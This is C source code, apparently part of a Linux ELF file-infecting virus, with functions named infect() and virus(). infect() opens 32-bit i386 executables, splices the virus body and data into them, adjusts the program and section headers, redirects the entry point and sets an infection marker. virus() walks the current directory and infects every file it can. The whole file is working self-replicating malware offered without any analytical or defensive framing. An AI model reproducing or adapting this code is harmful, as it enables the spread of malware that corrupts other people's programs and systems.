#ifndef	NEW_ENTRY
#	error	"NEW_ENTRY must be defined!"
#endif

#define	MIN_VICTIM_SIZE	1024
#define	MAX_VICTIM_SIZE	3*1024*1024
#define	ELFOSABI_TARGET	ELFOSABI_LINUX
#define	PAGE_SIZE	4096

#define	MAKE_HOLE(off,size) do {			\
	ftruncate(h,l+size);				\
	m = (char*)mremap(m,l,l + size, 0);		\
	if (m == MAP_FAILED) {				\
		goto _close;				\
	}						\
	if (off < l)					\
		memmove(m+off+size, m+off, l-off);	\
	l += size;					\
} while(0)
#define	SHIFT_SHDRS(offset,delta) do {			\
	if (ehdr->e_shoff >= offset)			\
		ehdr->e_shoff += delta;			\
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);	\
	for (i = 0; i < ehdr->e_shnum; i++)		\
		if (shdr[i].sh_offset >= offset)	\
			shdr[i].sh_offset += delta;	\
} while(0)

static int infect(char *filename)
{
	int h, l, i;
	char *m;
	Elf32_Ehdr *ehdr;
	Elf32_Phdr *phdr;
	Elf32_Shdr *shdr;

	/* open victim, check size, mmap... */	
	if ((h = open(filename, 2)) < 0)
		return 0;
	if ((l = lseek(h, 0, 2)) < MIN_VICTIM_SIZE || l > MAX_VICTIM_SIZE)
		goto _close;
	m = (void*)mmap(0x1000, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
	if (m == MAP_FAILED)
		goto _close;
	/* check ELF header */
	ehdr = (Elf32_Ehdr*)m;
	if (	*(uint32_t*)ehdr->e_ident != 0x464c457f ||
		ehdr->e_ehsize != sizeof(Elf32_Ehdr) ||
		ehdr->e_ident[EI_CLASS] != ELFCLASS32 ||
		ehdr->e_ident[EI_DATA] != ELFDATA2LSB ||
		ehdr->e_type != ET_EXEC ||
		ehdr->e_machine != EM_386 ||
		ehdr->e_version != EV_CURRENT ||
		ehdr->e_phentsize != sizeof(Elf32_Phdr) ||
		ehdr->e_phnum > 32 || /* suspicious */
		(ehdr->e_phoff + sizeof(Elf32_Phdr) * ehdr->e_phnum) > l ||
		(ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE && ehdr->e_ident[EI_OSABI] != ELFOSABI_TARGET) ||
		ehdr->e_shentsize != sizeof(Elf32_Shdr) ||
		(ehdr->e_shoff + sizeof(Elf32_Shdr) * ehdr->e_shnum) > l
	) goto _unmap;
	/* already infected? */
	if (m[15])
		goto _unmap;
	uint32_t old_entry = ehdr->e_entry;
	uint32_t new_text = 0, new_data;
	uint8_t *text, *data;

	phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);

	/* insert text */
	uint32_t t = 0;
	Elf32_Phdr *p = NULL;
	for (i = 0; i < ehdr->e_phnum; i++)
		if (phdr[i].p_type == PT_INTERP) {
			if (phdr[i].p_offset + phdr[i].p_filesz > l)
				goto _unmap;
			t = phdr[i].p_offset + phdr[i].p_filesz;
			/* do we have enough space? */
			if ((PAGE_SIZE - t) < text_size)
				goto _unmap;
		}
		else /* the p is needed to insert the data */
		if (phdr[i].p_type == PT_LOAD && (p == NULL || phdr[i].p_vaddr > p->p_vaddr))
			p = &phdr[i];
	if (p == NULL || (p->p_filesz + p->p_offset) > l)
		goto _unmap;
	/* no INTERP, put the virus right after PHDR */
	if (t == 0) 
		t = ehdr->e_phoff + ehdr->e_phnum * sizeof(Elf32_Phdr);

	/* copy virus body */
	MAKE_HOLE(0, PAGE_SIZE);
	memcpy(m + t, &__text_start, text_size);
	text = (uint8_t*)(m + t);
	bzero(m + t + text_size, PAGE_SIZE - text_size);
	/* adjust headers */
	SHIFT_SHDRS(0, PAGE_SIZE);
	for (i = 0; i < ehdr->e_phnum; i++) {
		/* extend text segment downwards */
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0) {
			phdr[i].p_vaddr -= PAGE_SIZE;
			phdr[i].p_paddr -= PAGE_SIZE;
			phdr[i].p_filesz+= PAGE_SIZE;
			phdr[i].p_memsz += PAGE_SIZE;
			new_text = phdr[i].p_vaddr + t;
		} else	/* leave these segments in the beginning... */
		if (phdr[i].p_type == PT_PHDR || phdr[i].p_type == PT_INTERP) {
			phdr[i].p_vaddr -= PAGE_SIZE;
			phdr[i].p_paddr -= PAGE_SIZE;
		} else	/* shift the others */
			phdr[i].p_offset+= PAGE_SIZE;
	}
	/* insert data */
	uint32_t u;	
	t = p->p_offset + p->p_filesz;
	u = p->p_vaddr + p->p_filesz;	
	MAKE_HOLE(t, data_size);
	memcpy(m + t, &__data_start, data_size);
	data = (uint8_t*)(m + t);
	p->p_filesz += data_size;
	if (p->p_memsz < p->p_filesz)
		p->p_memsz = p->p_filesz;
	SHIFT_SHDRS(t, data_size);
	new_data = u;

	/* that's all about */
	relocate(text, data, new_text, new_data, old_entry);

	ehdr->e_entry = NEW_ENTRY;

	m[15]++;
_unmap:	munmap(m, l);
_close:	close(h);
	return 0;
}

/* restore stack pointer and proceed to original program's entry point */
static void error(int s, volatile struct sigcontext c)
{
	c.esp = orig_esp;
	c.eip = (uint32_t)_recovery;
}

void virus(int foo)
{
	void _signal(int signum, void (*handler)(int, volatile struct sigcontext)) {
		asm("int $0x80"::"a"(__NR_signal),"b"(signum),"c"(handler));
	}
	orig_esp = (uint32_t)&foo;

	/* libc is not yet available */
	_signal(SIGSEGV, error);
	_signal(SIGBUS, error);

	/* determine "fragments" sizes */
	text_size = &__text_end - &__text_start;
	data_size = &__data_end - &__data_start;
	
	/* initilize virus & find the victims to infect */
	if (init())
		ftw(".", (int(*)(const char*,const struct stat*,int))infect, 1);

	/* remove error handler */
	signal(SIGSEGV, SIG_DFL);
	signal(SIGBUS, SIG_DFL);

#ifdef	DEBUG
	printf("Virus is OK!\n");
#endif

	/* clean our data, it's host's .bss */
	bzero(&__data_start, data_size);
}
